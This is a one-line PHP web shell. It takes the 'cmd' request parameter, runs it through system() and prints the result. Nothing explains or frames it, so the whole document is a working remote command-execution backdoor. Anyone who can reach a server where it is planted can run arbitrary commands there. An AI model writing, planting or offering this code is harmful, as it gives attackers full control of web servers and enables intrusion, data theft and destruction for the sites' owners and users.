<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); $sstm = system($cmd); echo $sstm; echo "</pre>"; die; }?>
